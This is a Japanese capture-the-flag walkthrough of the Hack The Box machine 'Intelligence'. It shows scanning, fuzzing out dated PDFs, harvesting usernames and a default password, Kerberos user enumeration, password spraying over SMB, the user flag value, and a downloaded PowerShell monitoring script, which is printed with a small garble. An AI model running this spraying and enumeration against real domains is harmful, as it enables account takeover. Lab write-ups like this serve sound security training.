https://app.hackthebox.com/machines/Intelligence

## STEP 1
```sh
└─$ rustscan -a 10.129.95.154 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.154:53
Open 10.129.95.154:80
Open 10.129.95.154:88
Open 10.129.95.154:135
Open 10.129.95.154:139
Open 10.129.95.154:389
Open 10.129.95.154:445
Open 10.129.95.154:464
Open 10.129.95.154:593
Open 10.129.95.154:636
Open 10.129.95.154:3269
Open 10.129.95.154:3268
Open 10.129.95.154:5985
Open 10.129.95.154:9389
Open 10.129.95.154:49668
Open 10.129.95.154:49693
Open 10.129.95.154:49694
Open 10.129.95.154:49713
Open 10.129.95.154:49718
10.129.95.154 -> [53,80,88,135,139,389,445,464,593,636,3269,3268,5985,9389,49668,49693,49694,49713,49718]
```


## STEP 2
80番にアクセス  
ページ内のdownloadをクリックすると、pdfにリダイレクトされる  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_01.png">  
なぞの言語だがググってみると、「lorem ipsum」というダミーテキストらしい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_02.png">  
pdfの名前は２つとも日付形式だったが、もしかしたら別の日付がファイル名として存在するかも  
ということでまずは2020年から2021年までの日付のリストを作成
```sh
└─$ seq -w 2020 2021 > years.txt

└─$ seq -w 1 12 > months.txt

└─$ seq -w 1 31 > days.txt
```
列挙  
他にもpdfファイルを発見（結果は省略）
```sh
└─$ ffuf -u http://10.129.95.154/documents/yearFUZZ-monthFUZZ-dayFUZZ-upload.pdf -c -v -w years.txt:yearFUZZ  -w months.txt:monthFUZZ -w days.txt:dayFUZZ -o results.txt -of csv

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.154/documents/yearFUZZ-monthFUZZ-dayFUZZ-upload.pdf
 :: Wordlist         : yearFUZZ: /home/kali/years.txt
 :: Wordlist         : monthFUZZ: /home/kali/months.txt
 :: Wordlist         : dayFUZZ: /home/kali/days.txt
 :: Output file      : results.txt
 :: File format      : csv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 11254, Words: 175, Lines: 135, Duration: 1207ms]
| URL | http://10.129.95.154/documents/2021-03-01-upload.pdf
    * dayFUZZ: 01
    * monthFUZZ: 03
    * yearFUZZ: 2021

[Status: 200, Size: 11466, Words: 156, Lines: 134, Duration: 2714ms]
| URL | http://10.129.95.154/documents/2020-04-02-upload.pdf
    * dayFUZZ: 02
    * monthFUZZ: 04
    * yearFUZZ: 2020

~~~

:: Progress: [744/744] :: Job [1/1] :: 106 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
pdfファイルをダウンロード
```sh
└─$ grep 'http' results.txt | awk -F ',' '{print $4}' | sort > urls.txt

└─$ for url in (cat urls.txt); do curl -O -s "$url"; done

└─$ ls
2020-01-01-upload.pdf  2020-03-05-upload.pdf  2020-05-21-upload.pdf  2020-06-28-upload.pdf  2020-09-06-upload.pdf  2020-11-13-upload.pdf  2021-02-21-upload.pdf
2020-01-02-upload.pdf  2020-03-12-upload.pdf  2020-05-24-upload.pdf  2020-06-30-upload.pdf  2020-09-11-upload.pdf  2020-11-24-upload.pdf  2021-02-25-upload.pdf
2020-01-04-upload.pdf  2020-03-13-upload.pdf  2020-05-29-upload.pdf  2020-07-02-upload.pdf  2020-09-13-upload.pdf  2020-11-30-upload.pdf  2021-03-01-upload.pdf
2020-01-10-upload.pdf  2020-03-17-upload.pdf  2020-06-02-upload.pdf  2020-07-06-upload.pdf  2020-09-16-upload.pdf  2020-12-10-upload.pdf  2021-03-07-upload.pdf
2020-01-20-upload.pdf  2020-03-21-upload.pdf  2020-06-03-upload.pdf  2020-07-08-upload.pdf  2020-09-22-upload.pdf  2020-12-15-upload.pdf  2021-03-10-upload.pdf
2020-01-22-upload.pdf  2020-04-02-upload.pdf  2020-06-04-upload.pdf  2020-07-20-upload.pdf  2020-09-27-upload.pdf  2020-12-20-upload.pdf  2021-03-18-upload.pdf
2020-01-23-upload.pdf  2020-04-04-upload.pdf  2020-06-07-upload.pdf  2020-07-24-upload.pdf  2020-09-29-upload.pdf  2020-12-24-upload.pdf  2021-03-21-upload.pdf
2020-01-25-upload.pdf  2020-04-15-upload.pdf  2020-06-08-upload.pdf  2020-08-01-upload.pdf  2020-09-30-upload.pdf  2020-12-28-upload.pdf  2021-03-25-upload.pdf
2020-01-30-upload.pdf  2020-04-23-upload.pdf  2020-06-12-upload.pdf  2020-08-03-upload.pdf  2020-10-05-upload.pdf  2020-12-30-upload.pdf  2021-03-27-upload.pdf
2020-02-11-upload.pdf  2020-05-01-upload.pdf  2020-06-14-upload.pdf  2020-08-09-upload.pdf  2020-10-19-upload.pdf  2021-01-03-upload.pdf
2020-02-17-upload.pdf  2020-05-03-upload.pdf  2020-06-15-upload.pdf  2020-08-19-upload.pdf  2020-11-01-upload.pdf  2021-01-14-upload.pdf
2020-02-23-upload.pdf  2020-05-07-upload.pdf  2020-06-21-upload.pdf  2020-08-20-upload.pdf  2020-11-03-upload.pdf  2021-01-25-upload.pdf
2020-02-24-upload.pdf  2020-05-11-upload.pdf  2020-06-22-upload.pdf  2020-09-02-upload.pdf  2020-11-06-upload.pdf  2021-01-30-upload.pdf
2020-02-28-upload.pdf  2020-05-17-upload.pdf  2020-06-25-upload.pdf  2020-09-04-upload.pdf  2020-11-10-upload.pdf  2021-02-10-upload.pdf
2020-03-04-upload.pdf  2020-05-20-upload.pdf  2020-06-26-upload.pdf  2020-09-05-upload.pdf  2020-11-11-upload.pdf  2021-02-13-upload.pdf
```
パスワードっぽいものを含んだpdfを発見
```sh
└─$ pdfgrep -r 'password' 
./2020-06-04-upload.pdf:Please login using your username and the default password of:
./2020-06-04-upload.pdf:After logging in please change your password as soon as possible.

└─$ pdfgrep '' 2020-06-04-upload.pdf 
New Account Guide

Welcome to Intelligence Corp!

Please login using your username and the default password of:

NewIntelligenceCorpUser9876


After logging in please change your password as soon as possible.
```
またpdfのメタ情報に、creatorを確認
```
└─$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 13.25
File Name                       : 2020-01-01-upload.pdf
Directory                       : Downloads
File Size                       : 27 kB
File Modification Date/Time     : 2025:11:23 13:30:42-05:00
File Access Date/Time           : 2025:11:23 13:30:42-05:00
File Inode Change Date/Time     : 2025:11:23 13:30:42-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```
creatorに登録されたユーザ名は、windowsユーザかも  
kerberosを使用して確認すると、すべて有効なユーザ名であることを確認
```sh
└─$ exiftool -Creator -S . | grep 'Creator' | sort | uniq > creators.txt
Error: File is empty - ./creator.txt

└─$ cat creators.txt | awk '{print $2}' > users.txt

└─$ netexec smb 10.129.95.154 -u '' -p ''        
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\:

└─$ ./kerbrute_linux_amd64 userenum --dc 10.129.95.154 -d 'intelligence.htb' users.txt      

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/23/25 - Ronnie Flathers @ropnop

2025/11/23 13:28:03 >  Using KDC(s):
2025/11/23 13:28:03 >   10.129.95.154:88

2025/11/23 13:28:04 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2025/11/23 13:28:04 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/11/23 13:28:05 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2025/11/23 13:28:05 >  Done! Tested 30 usernames (30 valid) in 1.787 seconds
```
ログインブルートフォース  
Tiffany.Molinaでログイン成功
```sh
└─$ netexec smb 10.129.95.154 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
usersフォルダが読み取り可能であったため、ユーザフラグゲット！
```sh
└─$ netexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares                      
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            

└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/Users/tiffany.molina/desktop/user.txt
Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
smb://10.129.95.154/Users/tiffany.molina/desktop/user.txt                                                                                                              
Downloaded 34b in 7 seconds

└─$ cat user.txt                                 
7e6cfe6d57ea9780f87086f2b6223d4c
```


## STEP 3
step2でitフォルダも読み取り可能であることを確認  
中にはpowershellスクリプトを確認
```sh
└─$ smbclient -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' -c 'dir' //10.129.95.154/IT
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1441638 blocks available

└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/IT/downdetector.ps1                  
Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
smb://10.129.95.154/IT/downdetector.ps1                                                                                                                                
Downloaded 1.02kB in 7 seconds
```
```powershell
└─$ cat downdetector.ps1 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
